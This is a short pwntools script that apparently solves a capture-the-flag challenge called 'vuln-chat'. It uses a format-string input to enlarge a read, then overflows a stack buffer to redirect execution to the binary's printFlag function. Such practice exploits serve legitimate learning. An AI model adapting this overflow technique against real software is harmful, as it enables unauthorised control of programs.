from pwn import *

elf = context.binary = ELF("./vuln-chat")

p = process()

p.recvline()


p.sendline(flat([b"A" * 20 , b"%200s"]))
p.sendline(flat([
    b"A" * 49,
    elf.sym["printFlag"]
]))

p.interactive()

